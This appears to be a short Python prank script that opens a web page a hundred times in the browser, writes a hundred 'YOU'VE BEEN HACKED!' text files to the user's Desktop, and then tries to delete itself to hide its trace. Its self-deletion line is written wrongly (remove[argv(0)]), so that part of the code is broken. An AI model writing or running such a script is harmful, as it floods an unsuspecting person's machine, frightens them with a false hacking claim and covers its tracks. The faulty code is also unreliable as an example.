#!/usr/bin/env python

#functionality for self-deletion
from os import remove
from sys import argv

import webbrowser as wb
name="HACKED!"
extension=".txt"

for i in range (100):
    wb.open("https://jackrgilmore.github.io/jackhack/")
    file = open("Desktop/"+ str(i+1).zfill(2) + name + extension, "w")
    file.write("YOU'VE BEEN HACKED!")

remove[argv(0)]


#note .zfill gives 00 padding to the filename.